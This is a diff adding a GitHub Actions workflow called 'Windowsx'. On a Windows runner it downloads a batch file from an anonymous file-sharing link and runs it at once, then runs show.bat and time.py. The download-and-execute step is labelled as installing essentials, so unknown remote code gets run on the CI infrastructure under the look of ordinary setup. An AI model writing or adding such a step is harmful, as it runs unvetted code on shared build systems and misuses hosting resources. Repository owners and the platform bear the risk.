@@ -1,0 +1,21 @@
+name: Windowsx
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Start Building...
+    runs-on: windows-latest
+    
+    steps:
+      - name: Downloading & Installing Essentials
+        run: |
+          Invoke-WebRequest -Uri "https://fs.fex.net/download/4838508496?fs_id=24&storage_file_id=3960647713" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
+
+      - name: Log  
+        run: cmd /c show.bat
+
+      - name: Time 
+        run: python time.py
